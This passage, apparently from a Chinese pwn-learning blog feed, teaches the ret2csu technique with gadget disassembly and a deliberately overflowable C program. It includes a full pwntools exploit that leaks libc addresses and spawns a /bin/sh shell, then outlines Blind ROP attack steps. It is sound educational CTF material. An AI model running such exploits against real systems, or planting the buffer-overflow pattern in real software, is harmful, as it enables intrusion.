&lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  401199: 41 56                 push   r14</span><br><span class="line">  40119b: 49 89 d6              mov    r14,rdx</span><br><span class="line">  40119e: 41 55                 push   r13</span><br><span class="line">  4011a0: 49 89 f5              mov    r13,rsi</span><br><span class="line">  4011a3: 41 54                 push   r12</span><br><span class="line">  4011a5: 41 89 fc              mov    r12d,edi</span><br><span class="line">  4011a8: 55                    push   rbp</span><br><span class="line">  4011a9: 48 8d 2d d0 1f 00 00  lea    rbp,[rip+0x1fd0]        # 403180 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011b0: 53                    push   rbx</span><br><span class="line">  4011b1: 4c 29 fd              sub    rbp,r15</span><br><span class="line">  4011b4: 48 83 ec 08           sub    rsp,0x8</span><br><span class="line">  4011b8: e8 43 fe ff ff        call   401000 &lt;_init&gt;</span><br><span class="line">  4011bd: 48 c1 fd 03           sar    rbp,0x3</span><br><span class="line">  4011c1: 74 1b                 je     4011de &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  4011c3: 31 db                 xor    ebx,ebx</span><br><span class="line">  4011c5: 0f 1f 00              nop    DWORD PTR [rax]</span><br><span class="line">  4011c8: 4c 89 f2              mov    rdx,r14</span><br><span class="line">  4011cb: 4c 89 ee              mov    rsi,r13</span><br><span class="line">  4011ce: 44 89 e7              mov    edi,r12d</span><br><span class="line">  4011d1: 41 ff 14 df           call   QWORD PTR [r15+rbx*8]</span><br><span class="line">  4011d5: 48 83 c3 01           add    rbx,0x1</span><br><span class="line">  4011d9: 48 39 dd              cmp    rbp,rbx</span><br><span class="line">  4011dc: 75 ea                 jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  4011de: 48 83 c4 08           add    rsp,0x8</span><br><span class="line">  4011e2: 5b                    pop    rbx</span><br><span class="line">  4011e3: 5d                    pop    rbp</span><br><span class="line">  4011e4: 41 5c                 pop    r12</span><br><span class="line">  4011e6: 41 5d                 pop    r13</span><br><span class="line">  4011e8: 41 5e                 pop    r14</span><br><span class="line">  4011ea: 41 5f                 pop    r15</span><br><span class="line">  4011ec: c3                    ret</span><br></pre></td></tr></table></figure><p>仔细观察一下就可以发现，我们可以通过<code>0x4011e2</code>处的 <strong>pop链</strong> 和 <code>0x4011c8</code>处的 <strong>mov链</strong> 控制程序执行一个已知地址的函数内容。<br>（ps：之所以控制的是<code>edi</code>而不是<code>rdi</code>寄存器却还能用来给函数传参是因为这里<code>rdi</code>寄存器的高三十二位值为0，可以自己编译一个小程序调试查看）<br>并且因为<strong>程序在执行时其实是cpu在执行程序中对应的机器码，所以最后的pop链其实可以通过控制地址偏移来实现不一样的pop链</strong>。<br>比如说，我们劫持<code>rip</code>后，控制地址为<code>0x4011e5</code>，此时将要执行的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4011e5: 5c                   pop    rsp</span><br><span class="line">4011e6: 41 5d                pop    r13</span><br><span class="line">4011e8: 41 5e                pop    r14</span><br><span class="line">4011ea: 41 5f                pop    r15</span><br><span class="line">4011ec: c3                   ret</span><br></pre></td></tr></table></figure><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>下面用实例演示对<code>__libc_csu_init</code>中的<code>gadgets</code>的利用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Intermediate%20ROP/ret2csu/level5">level5</a></p><p><strong>将其作为64位程序进行编译，并且开启堆栈不可执行（NX）保护</strong>。<br>（注：另外注意，获取shell用的shellcode一般是调用execve(‘/bin/sh’,0,0)函数，因为system函数会受本地环境变量影响导致不可用。）</p><p>该程序在<code>read()</code>时明显存在溢出，但是因为程序非常简单，所以无法找到其他直接控制传参寄存器的<code>gadgets</code>。所以我们覆盖返回地址为<code>__libc_csu_init</code>中的<code>gadgets</code>，然后布置相关参数。<br>这里的攻击思路是，先调用<code>write()</code>泄露<code>got</code>表中已经绑定的函数地址，然后查找到对应libc的版本计算出<code>execve()</code>的地址，然后通过<code>read()</code>将<code>/bin/sh</code>和<code>execve()的地址</code>写到<code>bss</code>段，最后再调用<code>execve()</code>获取shell。</p><p>利用脚本如下：</p><blockquote><p>ps：因为我的本地libc库版本不在LibcSearcher使用的数据库中，<br>所以这里我是先泄露出需要的地址，然后手动查询libc库，从中获<br>取相关数据，所以脚本中会出现计算偏移的步骤中直接用的已知值<br>计算，这些已知值是查询到相关的libc库中对应的基址后写入的）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入需要用到的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ret = <span class="number">0x4011e2</span></span><br><span class="line">mov_call = <span class="number">0x4011c8</span></span><br><span class="line">execve_offset = <span class="number">0xcb140</span></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 csu 中的 gadgets的利用payload 写成函数方便每次使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(a1,a2,a3,symbol_call)</span>:</span></span><br><span class="line"> payload = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line"> payload += p64(pop_ret)</span><br><span class="line"> payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(a1) + p64(a2) + p64(a3) + p64(symbol_call)</span><br><span class="line"> payload += p64(mov_call)</span><br><span class="line"> payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line"> payload += p64(main)</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 write 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got)</span><br><span class="line">write_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 read 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,read_got,<span class="number">8</span>,write_got)</span><br><span class="line">tmp = p.recv()</span><br><span class="line">print(tmp.encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 libc_start_main 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,libc_start_main_got,<span class="number">8</span>,write_got)</span><br><span class="line">libc_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc偏移量</span></span><br><span class="line">libcbase = libc_addr - <span class="number">0x026d20</span></span><br><span class="line">system_addr = <span class="number">0x048870</span> + libcbase</span><br><span class="line">bin_sh = <span class="number">0x1881ac</span> + libcbase</span><br><span class="line">execve_addr = execve_offset + libcbase</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,bss_addr,<span class="number">16</span>,read_got)</span><br><span class="line">p.send( <span class="string">'/bin/sh\x00'</span> + p64(execve_addr))</span><br><span class="line"></span><br><span class="line">csu(bss_addr,<span class="number">0</span>,<span class="number">0</span>,bss_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Blind-ROP-盲打pwn"><a href="#Blind-ROP-盲打pwn" class="headerlink" title="Blind ROP(盲打pwn)"></a>Blind ROP(盲打pwn)</h2><p>去实战刷题发现，这东西姿势太多，真的顶不住啊，还是先把例题手撸一遍叭emmm</p><blockquote><p>u1s1，我为啥会觉得后面的高级ROP里面的<code>SROP</code>挺简单的放在这里这个位置其实就挺好，这玩意和接下来的<code>dl_runtime_resolve</code>一起放高级pwn，单纯的pwn小白个人感觉，如果有大佬在小白blog里无聊翻到这里请一笑略过</p></blockquote><p>这里就不像<code>ctf-wiki</code>那样讲的写的那么细了，就用小白入门的方式做个记录。</p><h3 id="Blind-Pwn-原理"><a href="#Blind-Pwn-原理" class="headerlink" title="Blind Pwn 原理"></a>Blind Pwn 原理</h3><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><p>一个字————猜！！！。什么花里胡哨的paper，其实中心思想就是 <strong>盲猜</strong> 23333.<br><del>鄙人汐小鹰赌你的程序有！漏！洞！</del></p><p>当然，不能瞎吉儿猜，要有理有据的猜才行，毕竟有漏洞无伤大雅，谁写的程序还能没点毛病，关键是这个洞要能被攻击者测试出来，并且利用它实现特殊目的，它才能算是个有用的洞对不对。</p><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul><li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li><li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li></ul><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><ul><li>测试栈溢出长度，以及是否存在格式化字符串漏洞</li><li>枚举一个可用的返回地址，该地址可用的判断条件是只要程序运行到这个地址，一定会出现什么特征，并能让攻击者知晓</li><li>枚举一个<code>gadget</code>，一般是<code>libc_csu_init</code>的结尾那个<code>gadget</code></li></ul><h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">上篇-汐白学Pwn-3.1(ROP-Basic)</a></h2><h2 id="下篇-未完待续"><a href="#下篇-未完待续" class="headerlink" title="下篇-未完待续"></a>下篇-未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
</feed>
